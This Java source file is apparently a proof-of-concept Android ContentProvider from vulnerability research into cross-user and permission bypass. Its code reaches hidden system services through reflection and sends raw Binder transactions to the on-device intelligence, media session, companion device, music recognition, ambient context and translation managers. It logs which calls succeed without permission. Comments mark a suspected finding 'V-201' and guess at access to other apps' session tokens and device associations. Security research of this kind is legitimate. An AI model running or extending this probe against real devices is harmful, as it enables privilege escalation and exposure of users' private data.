package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class DeepProbeProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path == null) path = "/all";

        if (path.contains("odi") || path.contains("all")) {
            testODIDeep(cursor);
        }
        if (path.contains("mediadeep") || path.contains("all")) {
            testMediaSessionDeep(cursor);
        }
        if (path.contains("companiondeep") || path.contains("all")) {
            testCompanionDeep(cursor);
        }
        if (path.contains("musicdeep") || path.contains("all")) {
            testMusicRecognitionDeep(cursor);
        }
        if (path.contains("ambientdeep") || path.contains("all")) {
            testAmbientDeep(cursor);
        }
        if (path.contains("transldeep") || path.contains("all")) {
            testTranslationDeep(cursor);
        }

        return cursor;
    }

    private void testODIDeep(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("on_device_intelligence");
        if (binder == null) return;
        String desc = "android.app.ondeviceintelligence.IOnDeviceIntelligenceManager";

        // TX=10 returned 56 bytes - let's read them
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0);
            binder.transact(10, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"odi_tx10_avail", String.valueOf(avail)});
                // Dump raw bytes
                StringBuilder hex = new StringBuilder();
                byte[] bytes = new byte[Math.min(avail, 256)];
                reply.readByteArray(bytes);
                for (byte b : bytes) hex.append(String.format("%02x ", b));
                cursor.addRow(new Object[]{"odi_tx10_hex", hex.toString().trim()});
                // Also try interpreting as int+string
                reply.setDataPosition(4); // after exception code
                try {
                    int val1 = reply.readInt();
                    cursor.addRow(new Object[]{"odi_tx10_int1", String.valueOf(val1)});
                    if (val1 != 0) {
                        String str = reply.readString();
                        cursor.addRow(new Object[]{"odi_tx10_str1", str != null ? str : "null"});
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"odi_tx10_parse", "err:" + e.getMessage()});
                }
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"odi_tx10", "ERR:" + e.toString()});
        }
        data.recycle();
        reply.recycle();

        // TX=1 SUCCESS - let's probe with more data
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // Try passing a proper callback/params
            data.writeStrongBinder(new android.os.Binder()); // callback?
            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"odi_tx1_cb", "SUCCESS avail=" + reply.dataAvail()});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"odi_tx1_cb", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"odi_tx1_cb", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Try all TX codes with proper IBinder argument (many AI services take a callback)
        for (int tx = 2; tx <= 12; tx++) {
            if (tx == 10) continue; // already tested
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeStrongBinder(new android.os.Binder());
                data.writeInt(0);
                binder.transact(tx, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    cursor.addRow(new Object[]{"odi_tx" + tx + "_cb", "SUCCESS avail=" + reply.dataAvail()});
                } else {
                    String msg = reply.readString();
                    String s = truncate(msg);
                    if (s.contains("ermission")) {
                        cursor.addRow(new Object[]{"odi_tx" + tx + "_cb", "PERM:" + s});
                    } else {
                        cursor.addRow(new Object[]{"odi_tx" + tx + "_cb", "Ex=" + ex + "|" + s});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"odi_tx" + tx + "_cb", "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testMediaSessionDeep(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("media_session");
        if (binder == null) return;
        String desc = "android.media.session.ISessionManager";

        // TX=5 SUCCESS: onSessionPlaystateChanged(ISessionControllerCallback, int)
        // TX=7 SUCCESS: getSessionPolicies(MediaSession.Token)
        // TX=9 SUCCESS: setCustomMediaKeyDispatcher(String className) - THIS IS V-201!
        // TX=10 SUCCESS: setCustomMediaSessionPolicyProvider(String className) - ALSO POWERFUL!
        // TX=13 SUCCESS: could be getSession2TokensFromMediaButtonSession or similar

        // Test TX=9 with actual class name (V-201 verification)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(""); // empty class - should trigger specific behavior
            binder.transact(9, data, reply, 0);
            int ex = reply.readInt();
            cursor.addRow(new Object[]{"media_tx9_empty", "Ex=" + ex + " avail=" + reply.dataAvail()});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"media_tx9_empty", "THROW:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=2: getSessions with our packageName
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // getSessions(ComponentName, int userId)
            // Try with non-null ComponentName
            data.writeInt(1); // non-null
            data.writeString(getContext().getPackageName());
            data.writeString(".MainActivity");
            data.writeInt(0); // userId
            binder.transact(2, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                int count = -1;
                try { count = reply.readInt(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"media_getSessions", "SUCCESS avail=" + avail + " count=" + count});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"media_getSessions", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"media_getSessions", "THROW:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=3: getSession2Tokens(int userId) - could list other apps' session tokens
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // userId = current user
            binder.transact(3, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"media_getSession2Tokens", "SUCCESS avail=" + avail});
                if (avail > 0) {
                    try {
                        int listSize = reply.readInt();
                        cursor.addRow(new Object[]{"media_session2_count", String.valueOf(listSize)});
                    } catch (Exception ignored) {}
                }
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"media_getSession2Tokens", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"media_getSession2Tokens", "THROW:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=13: try with packageName (might be getSession2TokensFromMediaButtonSession)
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            binder.transact(13, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"media_tx13_pkg", "SUCCESS avail=" + reply.dataAvail()});
            } else {
                cursor.addRow(new Object[]{"media_tx13_pkg", "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"media_tx13_pkg", "THROW:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testCompanionDeep(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("companiondevice");
        if (binder == null) return;
        String desc = "android.companion.ICompanionDeviceManager";

        // TX=2 SUCCESS avail=4: likely getAssociations(callingPackage, userId) -> List<AssociationInfo>
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeInt(0); // userId
            binder.transact(2, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"companion_getAssoc", "SUCCESS avail=" + avail});
                if (avail >= 4) {
                    int listSize = reply.readInt();
                    cursor.addRow(new Object[]{"companion_assocCount", String.valueOf(listSize)});
                }
            } else {
                cursor.addRow(new Object[]{"companion_getAssoc", "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"companion_getAssoc", "THROW:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=5 SUCCESS: what is this? Could be getAllAssociationsForUser or similar
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // userId or associationId
            binder.transact(5, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"companion_tx5", "SUCCESS avail=" + avail});
            } else {
                cursor.addRow(new Object[]{"companion_tx5", "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"companion_tx5", "THROW:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=13 SUCCESS avail=4: what does it return?
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            binder.transact(13, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"companion_tx13", "SUCCESS avail=" + avail});
                if (avail >= 4) {
                    int val = reply.readInt();
                    cursor.addRow(new Object[]{"companion_tx13_val", String.valueOf(val)});
                }
            } else {
                cursor.addRow(new Object[]{"companion_tx13", "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"companion_tx13", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testMusicRecognitionDeep(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("music_recognition");
        if (binder == null) return;
        String desc = "android.media.musicrecognition.IMusicRecognitionManager";

        // TX=2,3,4,5 all SUCCESS without permission
        // TX=1 requires MANAGE_MUSIC_RECOGNITION
        // These unprotected methods might expose what music is being recognized/played
        for (int tx = 2; tx <= 5; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeStrongBinder(new android.os.Binder()); // callback
                data.writeString(getContext().getPackageName()); // packageName
                binder.transact(tx, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"music_tx" + tx + "_deep", "SUCCESS avail=" + avail});
                } else {
                    cursor.addRow(new Object[]{"music_tx" + tx + "_deep", "Ex=" + ex + "|" + truncate(reply.readString())});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"music_tx" + tx + "_deep", "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testAmbientDeep(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("ambient_context");
        if (binder == null) return;
        String desc = "android.app.ambientcontext.IAmbientContextManager";

        // TX=6,7,8 all SUCCESS without permission
        // TX=3 requires ACCESS_AMBIENT_CONTEXT_EVENT
        // These unprotected methods might expose ambient context state
        for (int tx = 6; tx <= 8; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                // Try with more data: userId, callback
                data.writeInt(0); // userId
                data.writeStrongBinder(new android.os.Binder()); // callback
                binder.transact(tx, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"ambient_tx" + tx + "_deep", "SUCCESS avail=" + avail});
                    if (avail > 0) {
                        byte[] b = new byte[Math.min(avail, 64)];
                        reply.readByteArray(b);
                        StringBuilder hex = new StringBuilder();
                        for (byte bb : b) hex.append(String.format("%02x", bb));
                        cursor.addRow(new Object[]{"ambient_tx" + tx + "_data", hex.toString()});
                    }
                } else {
                    cursor.addRow(new Object[]{"ambient_tx" + tx + "_deep", "Ex=" + ex + "|" + truncate(reply.readString())});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"ambient_tx" + tx + "_deep", "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testTranslationDeep(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("translation");
        if (binder == null) return;
        String desc = "android.view.translation.ITranslationManager";

        // TX=1,4 SUCCESS without permission (TX=5 requires MANAGE_UI_TRANSLATION)
        // TX=1 might be onTranslationCapabilitiesRequest - get available translation capabilities
        // TX=4 might be getServiceSettingsActivity

        // TX=1: try with proper format (int userId + IResultReceiver callback)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // userId
            data.writeStrongBinder(new android.os.Binder()); // IResultReceiver
            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"transl_tx1_deep", "SUCCESS avail=" + reply.dataAvail()});
            } else {
                cursor.addRow(new Object[]{"transl_tx1_deep", "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"transl_tx1_deep", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=4: try with proper format
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // userId
            data.writeStrongBinder(new android.os.Binder());
            binder.transact(4, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"transl_tx4_deep", "SUCCESS avail=" + reply.dataAvail()});
            } else {
                cursor.addRow(new Object[]{"transl_tx4_deep", "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"transl_tx4_deep", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
